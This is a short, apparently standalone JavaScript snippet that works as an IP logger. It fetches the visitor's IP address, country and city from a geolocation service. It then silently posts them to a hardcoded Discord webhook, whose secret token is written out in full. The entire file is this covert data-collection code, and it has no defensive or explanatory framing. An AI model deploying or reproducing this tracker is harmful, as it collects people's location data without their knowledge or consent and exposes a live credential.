// Hehe 0w0 ... Dont spam me pls :D
fetch("https://api.db-ip.com/v2/free/self").then(res => res.json()).then(json => {
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/932002879559057488/iWTSfZ-YRrRIJtVez61HOAPxsw-rQyGwgZ8lyAulXVLp1NR7PqPxUaNQN885HV0vcGrJ");
    request.setRequestHeader('Content-type', 'application/json');
    request.send(JSON.stringify({
        "embeds": [
            {
                "title": "New One",
                "color": 8542719,
                "fields": [
                    {
                        "name": "IP",
                        "value": json.ipAddress
                    },
                    {
                        "name": "Country",
                        "value": json.countryName
                    },
                    {
                        "name": "City",
                        "value": json.city
                    },
                ]
            }
        ]
    }));
})